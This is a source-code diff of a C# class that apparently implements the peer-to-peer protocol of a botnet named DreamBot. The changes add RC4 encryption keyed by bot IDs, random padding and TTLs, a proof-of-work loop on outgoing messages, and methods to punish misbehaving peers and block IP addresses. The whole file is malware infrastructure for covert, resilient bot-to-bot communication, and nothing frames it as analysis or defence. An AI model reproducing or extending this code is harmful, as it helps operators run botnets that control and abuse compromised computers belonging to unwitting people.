@@ -1,8 +1,11 @@
 using System;
+using System.Diagnostics;
 using System.Net;
+using System.Security.Cryptography;
 using DreamBot.Crypto;
 using DreamBot.Network.Comunication;
 using DreamBot.Network.Protocol.Messages;
+using DreamBot.System;
 using DreamBot.Utils;
 using DreamBot.Workers;
 
@@ -12,8 +15,8 @@ namespace DreamBot.Network.Protocol.Peers
     {
         private readonly BotIdentifier _botId;
         private readonly IWorkScheduler _worker;
-        private readonly ReplyWaitManager _waitingForReply;
         private readonly ComunicationManager _comunicationManager;
+        internal readonly ReplyWaitManager WaitingForReply;
 
         public EventHandler<PackageReceivedEventArgs<BotHeader>> BotPackageReceivedEventArgs;
         private readonly PeerList _peerList;
@@ -24,7 +27,7 @@ namespace DreamBot.Network.Protocol.Peers
             _comunicationManager.PackageReceivedEventArgs += PackageReceivedEventArgs;
             _worker = worker;
             _botId = botId;
-            _waitingForReply = new ReplyWaitManager(_comunicationManager);
+            WaitingForReply = new ReplyWaitManager(_comunicationManager);
 
             _worker.QueueForever(PurgeTimeouts, TimeSpan.FromSeconds(60));
             _peerList = peerList;
@@ -42,10 +45,10 @@ namespace DreamBot.Network.Protocol.Peers
         {
             var data = e.Payload;
 
-            var now = new TimeSpan(DateTime.UtcNow.Ticks);
-            var minutes = now.TotalMilliseconds / (1000 * 60);
-            var xor = new Mod2(BitConverter.GetBytes(minutes));
-            xor.Decrypt(data);
+            //var now = new TimeSpan(DateTime.UtcNow.Ticks);
+            //var minutes = (long)now.TotalMinutes;
+            //var xor = new Mod2(BitConverter.GetBytes(minutes));
+            //xor.Decrypt(data);
 
             var rc4 = new Rc4(_botId.ToByteArray());
             rc4.Decrypt(data);
@@ -59,7 +62,19 @@ namespace DreamBot.Network.Protocol.Peers
 
             botHeader.EndPoint = e.Proto;
             _peerList.UpdatePeer(botHeader.BotId);
-            Events.Raise(BotPackageReceivedEventArgs, this, new PackageReceivedEventArgs<BotHeader>(botHeader, data));
+
+            var args = new PackageReceivedEventArgs<BotHeader>(botHeader, data);
+            Events.Raise(BotPackageReceivedEventArgs, this, args);
+        }
+
+        internal void Punish(BotIdentifier botId)
+        {
+            _peerList.Punish(botId);
+        }
+
+        internal void Ban(IPEndPoint endpoint)
+        {
+            _comunicationManager.BlockIp(endpoint.Address);
         }
 
         private bool IsValidHeader(BotHeader botHeader)
@@ -71,39 +86,51 @@ namespace DreamBot.Network.Protocol.Peers
 
         private void PurgeTimeouts()
         {
-            _waitingForReply.PurgeTimeouts();
+            WaitingForReply.PurgeTimeouts();
         }
 
-        public void Send(short messageId, ulong correlationId, short ttl, byte[] payload, BotIdentifier botId)
+        public void Send(short messageId, ulong correlationId, short ttl, byte[] payload, BotIdentifier peerBotId, int requiredWork)
         {
-            if (!_peerList.IsRegisteredBot(botId)) return;
+            if (!_peerList.IsRegisteredBot(peerBotId) && messageId != 0)
+            {
+                Logger.Verbose(3, "Cannot send message to unkown {0} bot", peerBotId);
+                return;
+            }
+            byte[] message;
+            BotHeader header;
+            do
+            {
+                var padding = RandomUtils.NextPadding();
+                header = new BotHeader
+                {
+                    CorrelationId = correlationId == 0 ? RandomUtils.NextCorrelationId() : correlationId,
+                    BotId = _botId,
+                    MessageId = messageId,
+                    PayloadSize = (short) payload.Length,
+                    Padding = (short) padding.Length,
+                    Ttl = ttl == 0 ? RandomUtils.NextTtl() : ttl
+                };
 
-            var padding = RandomUtils.NextPadding();
-            var header = new BotHeader {
-                CorrelationId = correlationId == 0 ? RandomUtils.NextCorrelationId() : correlationId, 
-                BotId = botId, 
-                MessageId = messageId, 
-                PayloadSize = (short) payload.Length, 
-                Padding = (short) padding.Length, 
-                Ttl = ttl == 0 ? RandomUtils.NextTtl() : ttl
-            };
+                var preambule = BufferUtils.Concat(header.Encode(), padding);
+                message = BufferUtils.Concat(preambule, payload);
+            } while (!PoW.IsEnough(message, 0, message.Length, requiredWork));
 
-            var message = BufferUtils.Concat(header.Encode(), padding);
-
-            var rc4 = new Rc4(botId.ToByteArray());
+            var rc4 = new Rc4(peerBotId.ToByteArray());
             rc4.Encrypt(message);
 
-            var now = new TimeSpan(DateTime.UtcNow.Ticks);
-            var minutes = now.TotalMilliseconds / (1000 * 60);
-            var xor = new Mod2(BitConverter.GetBytes(minutes));
-            xor.Decrypt(message);
+            //var now = new TimeSpan(DateTime.UtcNow.Ticks);
+            //var minutes = (long)now.TotalMinutes;
+            //var xor = new Mod2(BitConverter.GetBytes(minutes));
+            //xor.Encrypt(message);
 
-            var endPoint = _peerList[botId];
+            var endPoint = _peerList[peerBotId];
 
             Logger.Verbose(3, "{0}@{1} {2}", header.BotId, endPoint, header.CorrelationId);
             _comunicationManager.Send(endPoint, message);
             if (correlationId == 0)
-                _waitingForReply.Add(new Package(endPoint, message), correlationId);
+            {
+                WaitingForReply.Add(new Package(endPoint, message), header.CorrelationId);
+            }
         }
     }
 }
